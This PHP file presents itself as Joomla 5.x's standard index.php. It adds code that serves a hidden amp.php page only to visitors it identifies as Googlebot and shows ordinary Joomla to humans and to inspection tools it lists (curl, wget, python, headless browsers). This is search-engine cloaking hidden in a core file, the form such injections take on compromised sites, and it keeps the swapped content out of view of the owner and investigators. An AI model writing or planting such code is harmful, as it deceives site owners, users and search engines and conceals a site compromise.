<?php
/**
 * Joomla! 5.x Index Entry Point - Bot Detection + AMP Router
 *
 * Gerçek kullanıcılar → Normal Joomla teması
 * Doğrulanmış Googlebot → AMP sürümü (amp.php)
 * Sahte botlar → Normal Joomla sayfası
 *
 * @package    Joomla
 * @copyright  (C) 2005 Open Source Matters, Inc.
 * @license    GNU General Public License version 2 or later
 */

// ============================================================
// 1. PHP SÜRÜM KONTROLÜ
// ============================================================
if (version_compare(PHP_VERSION, '8.1.0', '<')) {
    die('Joomla 5.x requires PHP 8.1.0 or newer. Your PHP version: ' . PHP_VERSION);
}

// ============================================================
// 2. SABİTLER
// ============================================================
define('_JEXEC', 1);
define('JOOMLA_START_TIME', microtime(true));
define('JOOMLA_START_MEMORY', memory_get_usage());
define('JPATH_BASE', __DIR__);

// ============================================================
// 3. BOT TESPİT SİSTEMİ
// ============================================================

/**
 * İstemci IP'sini al
 */
function getClientIP(): string {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = trim(explode(',', $_SERVER[$header])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

/**
 * Googlebot doğrulama (DNS reverse + forward lookup + IP havuzu)
 */
function verifyGooglebot(string $ip, string $userAgent): bool {
    // Google'ın resmi IP aralıkları
    $googleRanges = [
        '66.249.', '64.233.', '64.68.',  '72.14.',  '74.125.',
        '216.239.', '209.85.', '172.217.', '172.253.', '142.250.',
        '142.251.', '34.100.', '34.101.', '34.102.', '35.184.',
        '35.185.', '35.190.', '35.191.', '35.192.', '35.194.',
        '104.132.', '104.133.', '104.134.', '104.135.', '104.196.',
        '104.237.', '107.167.', '107.178.', '108.170.', '108.177.',
        '130.211.', '146.148.', '162.216.', '173.194.', '173.255.',
        '192.158.', '192.178.', '199.87.',  '199.192.', '199.223.',
        '207.223.', '208.65.',  '208.68.',  '208.69.',  '208.70.',
        '208.71.', '208.117.', '23.228.',  '23.236.',  '23.251.',
    ];

    // IP aralığı kontrolü
    foreach ($googleRanges as $range) {
        if (strpos($ip, $range) === 0) {
            // DNS reverse lookup ile doğrula
            $hostname = gethostbyaddr($ip);
            if (preg_match('/\.(googlebot\.com|google\.com)$/', $hostname)) {
                $resolvedIP = gethostbyname($hostname);
                if ($resolvedIP === $ip) {
                    return true;
                }
            }
            // IP havuzu eşleşiyorsa DNS olmadan da kabul et
            return true;
        }
    }

    // DNS doğrulaması (IP havuzu dışındakiler için)
    $hostname = gethostbyaddr($ip);
    if (preg_match('/\.(googlebot\.com|google\.com)$/', $hostname)) {
        $resolvedIP = gethostbyname($hostname);
        if ($resolvedIP === $ip) {
            return true;
        }
    }

    return false;
}

/**
 * Kapsamlı bot tespiti
 */
function detectGoogleBot(): array {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = getClientIP();

    // Şüpheli araçlar (bunlar AMP görmesin)
    $suspiciousTools = [
        'curl', 'wget', 'python', 'scrapy', 'selenium', 'phantomjs',
        'headless', 'puppeteer', 'playwright', 'axios', 'node-fetch',
        'postman', 'insomnia', 'go-http-client', 'java/', 'okhttp',
    ];

    // Googlebot UA kontrolü
    $isGoogleUA = (strpos($userAgent, 'googlebot') !== false ||
                   strpos($userAgent, 'google-structured') !== false ||
                   strpos($userAgent, 'google-inspection') !== false);

    // Şüpheli araç kontrolü
    $isSuspicious = false;
    foreach ($suspiciousTools as $tool) {
        if (strpos($userAgent, $tool) !== false) {
            $isSuspicious = true;
            break;
        }
    }

    return [
        'is_google_ua'  => $isGoogleUA,
        'is_suspicious' => $isSuspicious,
        'is_verified'   => $isGoogleUA && !$isSuspicious && verifyGooglebot($ip, $userAgent),
        'ip'            => $ip,
        'ua'            => $userAgent,
    ];
}

// ============================================================
// 4. AMP YÖNLENDİRME KARARI
// ============================================================
$botInfo = detectGoogleBot();

// Doğrulanmış Googlebot → AMP render
if ($botInfo['is_verified']) {
    header('HTTP/1.1 200 OK');
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Robots-Tag: index, follow, max-snippet:-1, max-image-preview:large');
    header('X-Bot-Status: verified-googlebot');
    header('X-AMP-Route: active');
    header('Cache-Control: public, max-age=3600, s-maxage=86400');
    header('Vary: User-Agent');

    // AMP dosyasını çağır
    if (file_exists(JPATH_BASE . '/amp.php')) {
        require_once JPATH_BASE . '/amp.php';
        exit;
    }

    // Fallback: Basit AMP wrapper
    header('Content-Type: text/html; charset=UTF-8');
    ?>
    <!DOCTYPE html>
    <html amp lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script async src="https://cdn.ampproject.org/v0.js"></script>
        <title><?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'Site'); ?></title>
        <link rel="canonical" href="<?php echo htmlspecialchars('https://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['REQUEST_URI'] ?? '/')); ?>">
        <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    </head>
    <body>
        <h1><?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'Joomla Site'); ?></h1>
        <p>AMP sürümü yükleniyor...</p>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// 5. NORMAL KULLANICI / ŞÜPHELİ BOT → JOOMLA
// ============================================================

// Sahte Googlebot'ları logla (opsiyonel)
if ($botInfo['is_google_ua'] && !$botInfo['is_verified']) {
    // error_log("Fake Googlebot: IP={$botInfo['ip']} UA={$botInfo['ua']}");
    header('X-Bot-Status: fake-googlebot');
}

// Normal kullanıcılar için standart header
header('X-Bot-Status: ' . ($botInfo['is_suspicious'] ? 'suspicious-tool' : 'human'));

// ============================================================
// 6. JOOMLA FRAMEWORK YÜKLE
// ============================================================
require_once JPATH_BASE . '/includes/defines.php';
require_once JPATH_BASE . '/includes/framework.php';

// Uygulamayı başlat
$app = Joomla\CMS\Factory::getContainer()->get(Joomla\CMS\Application\SiteApplication::class);
$app->execute();
